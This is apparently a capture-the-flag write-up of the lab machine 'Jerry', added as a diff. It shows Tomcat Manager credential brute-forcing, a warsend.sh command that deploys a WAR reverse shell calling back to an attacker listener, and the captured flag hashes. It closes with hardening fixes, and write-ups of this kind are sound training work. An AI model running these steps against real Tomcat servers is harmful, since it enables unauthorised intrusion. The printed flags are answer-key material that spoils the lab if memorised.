@@ -1,0 +1,129 @@
+# Jerry Write-Up
+
+Target: 10.10.10.95
+
+---
+
+## Introduction
+- Objective: Obtain the user and root flag
+- Tools: Nmap, Python (apache-tomcat-login-bruteforce.py), Warsend, Netcat
+
+---
+
+## Initial Reconnaissance
+	- Port Scanning: Nmap scan
+		- Command: nmap -sC -sV -vv 10.10.10.95
+		- Output: 
+			8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
+	- Observations: Apache Tomcat 7.0.88
+
+---
+
+## Enumeration
+	- Service Exploration:
+		- Service 1: Web Server (Tomcat)
+			- Command: Visit http://10.10.10.95:8080 in browser
+			- Output: Found /manager/html (Tomcat Manager)
+		- Service 2: Credential Brute-Force
+			- Command: python3 apache-tomcat-login-bruteforce.py http://10.10.10.95:8080/manager/html
+			- Output: 
+				Username: tomcat
+				Password: s3cret
+	- Manual Checks: 
+		- Explored Tomcat Manager interface, identified option to upload and deploy WAR files
+	- Key Findings: 
+		- Tomcat Manager credentials: tomcat/s3cret
+
+---
+
+## Exploitation
+	- Initial Access: Tomcat Manager Login
+		- Command: Login to http://10.10.10.95:8080/manager/html
+			Username: tomcat
+			Password: s3cret
+		- Output: Successful login to Tomcat Manager
+	- Shell Access: Deploy WAR File Reverse Shell
+		- Command: ./warsend.sh 10.10.16.6 8090 10.10.10.95 8080 tomcat s3cret revshell
+		- Output: 
+			[+] LHOST: 10.10.16.6
+			[+] LPORT: 8090
+			[+] RHOST: 10.10.10.95
+			[+] RPORT: 8080
+			[+] Username: tomcat
+			[+] Password: s3cret
+			[+] Login Successful!
+			[+] Generating WAR Reverse Shell...
+			[!] Uploading WAR File...
+			OK - Deployed application at context path /revshell
+			[!] Triggering Reverse Shell...
+			[+] Starting Listener...
+			connect to [10.10.16.6] from (UNKNOWN) [10.10.10.95] 49193
+			C:\apache-tomcat-7.0.88>
+
+## User Flag
+	- Command: cd \Users\Administrator\Desktop && type "2 for the price of 1.txt"
+	- Output: 
+		user.txt: 7004dbcef0f854e0fb401875f26ebd00
+
+---
+
+## Privilege Escalation
+	- Step 1: Information Gathering:
+		- System Info: 
+			- Command: ver
+			- Output: Microsoft Windows [Version 6.3.9600]
+		- User Context:
+			- Command: whoami
+			- Output: nt authority\system
+		- Automated Tools:
+			- Command: Not used
+			- Output: Not used
+	- Step 2: Identify Vectors:
+		- SUID Binaries:
+			- Command: Not applicable (Windows)
+			- Output: Not applicable
+		- Cron Jobs:
+			- Command: Not applicable (Windows)
+			- Output: Not applicable
+		- Kernel Exploits:
+			- Command: Not used
+			- Output: Not used
+		- Misconfigurations:
+			- Command: Not used
+			- Output: Already running as SYSTEM (highest privilege)
+	- Step 3: Exploit the Vector: None needed
+		- Output: Already have SYSTEM shell from WAR file deployment
+	- Step 4: Verify Access:
+		- Command: whoami
+		- Output: nt authority\system
+
+---
+
+## Post-Exploitation
+	- Flag Retrieval:
+		- Command: cd \Users\Administrator\Desktop && type "2 for the price of 1.txt"
+		- Output: 
+			root.txt: 04a8b36e1545a455393d067e772fe90e
+	- Persistence (Optional): Not implemented
+	- Evidence: Not provided
+
+---
+
+## Conclusion
+- Summary: In "Jerry" (10.10.10.95), I used Nmap to find port 8080 running Apache Tomcat 7.0.88. I brute-forced the Tomcat Manager credentials (tomcat/s3cret) using a Python script. I deployed a WAR file reverse shell with Warsend, gaining a SYSTEM shell. From \Users\Administrator\Desktop, I retrieved both the user flag (7004dbcef0f854e0fb401875f26ebd00) and root flag (04a8b36e1545a455393d067e772fe90e) from a single file, "2 for the price of 1.txt."
+- Lessons Learned: I need to improve my enumeration of web servers—Nmap found Tomcat, but I could’ve used FFUF to confirm /manager/html faster. Brute-forcing credentials worked, but I should’ve tried default Tomcat logins (like tomcat/tomcat) first to save time. I also need to get more comfortable with WAR files and reverse shells, as setting up Warsend took longer than expected due to unfamiliarity with Tomcat.
+- Fixes:
+	- Secure Tomcat Manager Credentials: Change default credentials (tomcat/s3cret) to strong, unique passwords.
+	- Disable WAR File Deployment: Restrict Tomcat Manager’s WAR file upload feature to prevent unauthorized deployments.
+	- Limit Tomcat Manager Access: Restrict access to /manager/html with IP whitelisting or authentication.
+	- Remove Sensitive Files: Avoid storing flags or sensitive data in accessible directories like \Users\Administrator\Desktop.
+
+---
+
+## Appendix
+- Additional Details: Explored \Users\Public directory but found nothing noteworthy.
+- Tools and Exploits:
+	- Nmap
+	- Python (apache-tomcat-login-bruteforce.py)
+	- Warsend
+	- Netcat
